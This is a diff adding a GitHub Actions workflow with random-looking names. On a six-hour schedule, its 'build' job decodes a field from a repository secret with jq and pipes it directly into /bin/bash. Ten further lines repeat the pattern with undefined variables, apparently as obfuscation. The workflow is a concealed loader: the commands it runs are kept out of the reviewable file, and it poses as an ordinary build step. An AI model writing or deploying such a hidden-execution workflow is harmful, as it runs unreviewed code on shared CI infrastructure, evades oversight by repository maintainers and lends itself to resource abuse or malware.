@@ -1,0 +1,28 @@
+name: heqinwangha
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: heqinwangha
+        env:
+          oekuf7: ${{ secrets.oekuf7 }}
+        run: |
+          echo $oekuf7 | jq -r .k31 | /bin/bash
+          echo $ww96607 | jq -r .ah27 | /bin/bash
+          echo $s8321 | jq -r .hqovf277 | /bin/bash
+          echo $vb66029 | jq -r .bm34499 | /bin/bash
+          echo $qtr64 | jq -r .le11027 | /bin/bash
+          echo $kegsd55516 | jq -r .daqov9 | /bin/bash
+          echo $mgfp56353 | jq -r .yfpjw19 | /bin/bash
+          echo $j8 | jq -r .ssamx3670 | /bin/bash
+          echo $czxm8795 | jq -r .dzg0 | /bin/bash
+          echo $kh4 | jq -r .lehb5620 | /bin/bash
+          echo $bmvqm5 | jq -r .f29376 | /bin/bash
+
